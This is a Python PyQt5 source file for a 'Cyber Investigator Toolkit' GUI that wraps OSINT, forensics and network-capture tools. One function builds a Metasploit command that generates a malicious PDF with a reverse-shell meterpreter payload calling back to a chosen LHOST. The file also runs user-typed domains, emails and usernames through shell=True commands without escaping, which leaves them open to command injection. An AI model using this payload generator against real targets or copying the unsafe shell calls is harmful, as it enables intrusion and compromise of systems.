import sys
import random
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QPushButton, QVBoxLayout, QWidget, QTextEdit, QLabel, QLineEdit, QStackedLayout,
    QDialog, QHBoxLayout, QFileDialog, QMessageBox, QComboBox
)
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QPainter, QColor, QFont, QClipboard
import subprocess
import platform
import shutil

# Matrix-style animated background widget
class MatrixBackground(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.setAttribute(Qt.WA_OpaquePaintEvent)
        self.setAutoFillBackground(False)
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update)
        self.timer.start(50)
        self.font_size = 18
        self.columns = self.width() // self.font_size if self.width() > 0 else 40
        self.drops = [random.randint(0, self.height() // self.font_size) for _ in range(self.columns)]
        self.chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*'

    def resizeEvent(self, event):
        self.columns = self.width() // self.font_size
        self.drops = [random.randint(0, self.height() // self.font_size) for _ in range(self.columns)]
        super().resizeEvent(event)

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.fillRect(self.rect(), QColor(10, 20, 10))
        painter.setFont(QFont('Consolas', self.font_size, QFont.Bold))
        for i in range(self.columns):
            text = random.choice(self.chars)
            x = i * self.font_size
            y = self.drops[i] * self.font_size
            painter.setPen(QColor(0, 255, 70))
            painter.drawText(x, y, text)
            if y > self.height() and random.random() > 0.975:
                self.drops[i] = 0
            else:
                self.drops[i] += 1

# Result dialog for tool output
class ResultDialog(QDialog):
    def __init__(self, title, result_text, parent=None):
        super().__init__(parent)
        self.setWindowTitle(title)
        self.setMinimumSize(600, 400)
        self.result_text = result_text
        self.theme = 'dark'
        self.font_size = 14
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout(self)
        self.text_area = QTextEdit()
        self.text_area.setReadOnly(True)
        self.text_area.setText(self.result_text)
        self.set_theme(self.theme)
        self.set_font_size(self.font_size)
        layout.addWidget(self.text_area)

        btn_layout = QHBoxLayout()
        btn_copy = QPushButton('Copy')
        btn_copy.clicked.connect(self.copy_result)
        btn_layout.addWidget(btn_copy)
        btn_save = QPushButton('Save')
        btn_save.clicked.connect(self.save_result)
        btn_layout.addWidget(btn_save)
        btn_clear = QPushButton('Clear')
        btn_clear.clicked.connect(self.clear_result)
        btn_layout.addWidget(btn_clear)
        # Font size selector
        self.font_box = QComboBox()
        self.font_box.addItems([str(s) for s in range(10, 25, 2)])
        self.font_box.setCurrentText(str(self.font_size))
        self.font_box.currentTextChanged.connect(self.change_font_size)
        btn_layout.addWidget(QLabel('Font:'))
        btn_layout.addWidget(self.font_box)
        # Theme selector
        self.theme_box = QComboBox()
        self.theme_box.addItems(['dark', 'light', 'matrix'])
        self.theme_box.setCurrentText(self.theme)
        self.theme_box.currentTextChanged.connect(self.change_theme)
        btn_layout.addWidget(QLabel('Theme:'))
        btn_layout.addWidget(self.theme_box)
        layout.addLayout(btn_layout)

    def copy_result(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.text_area.toPlainText())

    def save_result(self):
        fname, _ = QFileDialog.getSaveFileName(self, 'Save Result', '', 'Text Files (*.txt);;All Files (*)')
        if fname:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(self.text_area.toPlainText())
            QMessageBox.information(self, 'Saved', f'Result saved to {fname}')

    def clear_result(self):
        self.text_area.clear()

    def set_font_size(self, size):
        self.text_area.setFont(QFont('Consolas', int(size)))

    def change_font_size(self, size):
        self.font_size = int(size)
        self.set_font_size(self.font_size)

    def set_theme(self, theme):
        if theme == 'dark':
            self.text_area.setStyleSheet('background: #111; color: #00FF41;')
            self.setStyleSheet('background: #222;')
        elif theme == 'light':
            self.text_area.setStyleSheet('background: #fff; color: #222;')
            self.setStyleSheet('background: #eee;')
        elif theme == 'matrix':
            self.text_area.setStyleSheet('background: #101810; color: #00FF41;')
            self.setStyleSheet('background: #101810;')

    def change_theme(self, theme):
        self.theme = theme
        self.set_theme(theme)

class CyberInvestigator(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Cyber Investigator Toolkit")
        self.setGeometry(100, 100, 800, 1000)
        self.setStyleSheet("background: transparent;")

        # Main container with stacked layout for background + content
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.stack = QStackedLayout(self.central_widget)

        # Matrix background
        self.bg = MatrixBackground(self)
        self.stack.addWidget(self.bg)

        # Foreground content widget
        self.fg_widget = QWidget()
        self.stack.addWidget(self.fg_widget)
        self.stack.setCurrentWidget(self.fg_widget)
        self.stack.setStackingMode(QStackedLayout.StackAll)

        layout = QVBoxLayout(self.fg_widget)
        layout.setContentsMargins(40, 20, 40, 20)
        layout.setSpacing(10)

        label_style = "color: #00FF41; font-weight: bold; font-size: 16px; font-family: Consolas;"
        input_style = "background: #111; color: #00FF41; border: 1px solid #00FF41; font-family: Consolas; font-size: 15px;"
        button_style = "QPushButton { background: #111; color: #00FF41; border: 2px solid #00FF41; font-family: Consolas; font-size: 15px; padding: 6px; } QPushButton:hover { background: #222; }"
        output_style = "background: #111; color: #00FF41; font-family: Consolas; font-size: 15px;"

        # Input fields
        layout.addWidget(QLabel("Enter Domain:", styleSheet=label_style))
        self.domain_input = QLineEdit()
        self.domain_input.setPlaceholderText("example.com")
        self.domain_input.setStyleSheet(input_style)
        layout.addWidget(self.domain_input)

        layout.addWidget(QLabel("Enter Phone Number (with country code):", styleSheet=label_style))
        self.phone_input = QLineEdit()
        self.phone_input.setPlaceholderText("+919999999999")
        self.phone_input.setStyleSheet(input_style)
        layout.addWidget(self.phone_input)

        layout.addWidget(QLabel("Enter Email Address:", styleSheet=label_style))
        self.email_input = QLineEdit()
        self.email_input.setPlaceholderText("test@example.com")
        self.email_input.setStyleSheet(input_style)
        layout.addWidget(self.email_input)

        layout.addWidget(QLabel("Enter Username:", styleSheet=label_style))
        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("johndoe")
        self.username_input.setStyleSheet(input_style)
        layout.addWidget(self.username_input)

        layout.addWidget(QLabel("LHOST (for PDF Exploit):", styleSheet=label_style))
        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("127.0.0.1")
        self.lhost_input.setStyleSheet(input_style)
        layout.addWidget(self.lhost_input)

        layout.addWidget(QLabel("LPORT (for PDF Exploit):", styleSheet=label_style))
        self.lport_input = QLineEdit()
        self.lport_input.setPlaceholderText("4444")
        self.lport_input.setStyleSheet(input_style)
        layout.addWidget(self.lport_input)

        # OSINT Tools
        layout.addWidget(QLabel("🔍 OSINT Tools", styleSheet=label_style))
        btn_whois = QPushButton("Run WHOIS Lookup")
        btn_whois.setStyleSheet(button_style)
        btn_whois.clicked.connect(self.run_whois)
        layout.addWidget(btn_whois)

        btn_dns = QPushButton("Run DNS Recon")
        btn_dns.setStyleSheet(button_style)
        btn_dns.clicked.connect(self.run_dnsrecon)
        layout.addWidget(btn_dns)

        btn_phone_osint = QPushButton("Phone Number OSINT (PhoneInfoga)")
        btn_phone_osint.setStyleSheet(button_style)
        btn_phone_osint.clicked.connect(self.run_phone_osint)
        layout.addWidget(btn_phone_osint)

        btn_email_osint = QPushButton("Email Intelligence (Holehe)")
        btn_email_osint.setStyleSheet(button_style)
        btn_email_osint.clicked.connect(self.run_email_osint)
        layout.addWidget(btn_email_osint)

        btn_username_osint = QPushButton("Username Search (Maigret)")
        btn_username_osint.setStyleSheet(button_style)
        btn_username_osint.clicked.connect(self.run_username_osint)
        layout.addWidget(btn_username_osint)

        # Forensics Tools
        layout.addWidget(QLabel("📀 Forensics Tools", styleSheet=label_style))
        btn_usb_history = QPushButton("USB History")
        btn_usb_history.setStyleSheet(button_style)
        btn_usb_history.clicked.connect(self.run_usb_history)
        layout.addWidget(btn_usb_history)

        btn_volatility = QPushButton("Run Volatility - RAM Analysis")
        btn_volatility.setStyleSheet(button_style)
        btn_volatility.clicked.connect(self.run_volatility)
        layout.addWidget(btn_volatility)

        # Network Monitoring
        layout.addWidget(QLabel("📈 Network Monitoring", styleSheet=label_style))
        btn_tshark = QPushButton("Run Tshark Capture")
        btn_tshark.setStyleSheet(button_style)
        btn_tshark.clicked.connect(self.run_tshark)
        layout.addWidget(btn_tshark)

        # PDF Exploit Testing
        layout.addWidget(QLabel("📁 PDF Exploit Testing", styleSheet=label_style))
        btn_pdf_exploit = QPushButton("Generate Malicious PDF (Metasploit)")
        btn_pdf_exploit.setStyleSheet(button_style)
        btn_pdf_exploit.clicked.connect(self.run_pdf_exploit)
        layout.addWidget(btn_pdf_exploit)

        # Output area (hidden, not used)
        self.output_area = QTextEdit()
        self.output_area.setReadOnly(True)
        self.output_area.setStyleSheet(output_style)
        self.output_area.hide()
        layout.addWidget(self.output_area)

    def show_result(self, title, result):
        dlg = ResultDialog(title, result, self)
        dlg.exec_()

    def run_command(self, command, powershell=False):
        try:
            if powershell:
                output = subprocess.check_output(["powershell", "-Command", command], stderr=subprocess.STDOUT, universal_newlines=True)
            else:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            return output
        except FileNotFoundError:
            return "Error: Command not found. Please ensure the tool is installed and in your PATH."
        except subprocess.CalledProcessError as e:
            return "Error:\n" + e.output
        except Exception as e:
            return f"Unexpected error: {e}"

    def get_domain(self):
        domain = self.domain_input.text().strip()
        if not domain:
            domain = "example.com"
        return domain

    def get_phone(self):
        phone = self.phone_input.text().strip()
        if not phone:
            phone = "+919999999999"
        return phone

    def get_email(self):
        email = self.email_input.text().strip()
        if not email:
            email = "test@example.com"
        return email

    def get_username(self):
        username = self.username_input.text().strip()
        if not username:
            username = "johndoe"
        return username

    def get_lhost(self):
        lhost = self.lhost_input.text().strip()
        if not lhost:
            lhost = "127.0.0.1"
        return lhost

    def get_lport(self):
        lport = self.lport_input.text().strip()
        if not lport:
            lport = "4444"
        return lport

    def run_whois(self):
        domain = self.get_domain()
        if shutil.which("whois"):
            result = self.run_command(f"whois {domain}")
        else:
            result = "Error: 'whois' tool not found. Download from Sysinternals and add to PATH."
        self.show_result("WHOIS Lookup Result", result)

    def run_dnsrecon(self):
        domain = self.get_domain()
        if shutil.which("python"):
            result = self.run_command(f"python -m dnsrecon -d {domain}")
        else:
            result = "Error: Python or dnsrecon not found. Install with 'pip install dnsrecon'."
        self.show_result("DNS Recon Result", result)

    def run_phone_osint(self):
        phone = self.get_phone()
        if shutil.which("phoneinfoga"):
            result = self.run_command(f"phoneinfoga scan -n {phone}")
        else:
            result = "Error: 'phoneinfoga' not found. See https://github.com/sundowndev/phoneinfoga for installation."
        self.show_result("PhoneInfoga Result", result)

    def run_email_osint(self):
        email = self.get_email()
        if shutil.which("holehe"):
            result = self.run_command(f"holehe {email}")
        else:
            result = "Error: 'holehe' not found. Install with 'pip install holehe'."
        self.show_result("Holehe Result", result)

    def run_username_osint(self):
        username = self.get_username()
        if shutil.which("python") and shutil.which("maigret"):
            result = self.run_command(f"maigret {username}")
        elif shutil.which("python"):
            result = self.run_command(f"python -m maigret {username}")
        else:
            result = "Error: 'maigret' not found. Install with 'pip install maigret'."
        self.show_result("Maigret Result", result)

    def run_usb_history(self):
        if platform.system() == "Windows":
            command = "Get-WmiObject Win32_USBHub | Select-Object DeviceID, Description"
            result = self.run_command(command, powershell=True)
        else:
            result = "USB History is only supported on Windows in this tool."
        self.show_result("USB History Result", result)

    def run_volatility(self):
        if shutil.which("volatility"):
            result = self.run_command("volatility -f memdump.raw --profile=Win10x64_18362 pslist")
        else:
            result = "Error: 'volatility' not found. Download and add to PATH."
        self.show_result("Volatility Result", result)

    def run_tshark(self):
        if shutil.which("tshark"):
            result = self.run_command("tshark -a duration:10")
        else:
            result = "Error: 'tshark' not found. Install Wireshark and add to PATH."
        self.show_result("Tshark Result", result)

    def run_pdf_exploit(self):
        lhost = self.get_lhost()
        lport = self.get_lport()
        if shutil.which("msfconsole"):
            cmd = (
                f"msfconsole -q -x \"use exploit/fileformat/adobe_pdf_embedded_exe; "
                f"set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit; exit\""
            )
            result = self.run_command(cmd)
        else:
            result = "Error: 'msfconsole' (Metasploit) not found. See https://docs.metasploit.com/docs/using-metasploit/getting-started.html for installation."
        self.show_result("PDF Exploit Result", result)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = CyberInvestigator()
    window.show()
    sys.exit(app.exec_())
